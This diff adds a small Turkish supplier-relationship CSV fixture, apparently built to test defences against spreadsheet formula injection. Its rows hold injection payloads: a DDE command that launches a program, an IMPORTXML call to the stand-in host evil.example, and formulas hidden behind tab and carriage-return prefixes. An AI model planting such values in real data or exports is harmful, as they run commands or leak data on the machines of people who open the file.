@@ -1,0 +1,3 @@
+Şirket Adı,Tedarikçi Kurum,İlişki Türü,Kritiklik_Skoru,Tarih,Notlar
+=CMD|' /C calc'!A0,+MALICIOUS_SUM(A1:A2),-2+5+HYPERLINK(),0.75,2026-02-10,@IMPORTXML('http://evil.example')
+	=TAB_INJECT(),"=CR_INJECT()",Normal İlişki,0.60,2026-02-11,Güvenlik testi satırı
